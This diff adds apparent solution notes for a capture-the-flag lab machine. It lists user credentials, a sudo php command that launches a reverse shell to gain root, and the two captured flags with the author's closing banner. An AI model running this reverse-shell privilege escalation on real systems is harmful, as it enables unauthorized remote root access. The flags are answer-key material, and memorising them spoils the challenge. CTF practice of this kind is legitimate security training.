@@ -1,0 +1,44 @@
+1 Aing Maung
+aingmaung:qwerty!!!
+
+2 Eweuh Tandingan
+eweuhtandingan:skuyatuh
+
+3 Sunda Tea
+sundatea:indONEsia
+
+4 ...
+
+# SSH creds:
+5 Alice Geulis
+alice:4lic3
+
+# we can sudo php as alice:
+sudo /usr/bin/php php-reverse-shell.php
+
+
+$ cat /home/alice/.my_secret/flag1.txt
+Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!
+
+Now your last job is get access to the root and read the flag ^_^
+
+Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
+
+
+# cat /root/flag2.txt 
+
+  ________        __    ___________.__             ___________.__                ._.
+ /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
+/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
+\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
+ \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
+        \/                              \/     \/       \/              \//_____/ \/
+
+Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you
+ like it or not because it can be a reference for me to be even better! I hope this can continue :)
+
+Contact me if you want to contribute / give me feedback / share your writeup!
+Twitter: @makegreatagain_
+Instagram: @aldodimas73
+
+Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
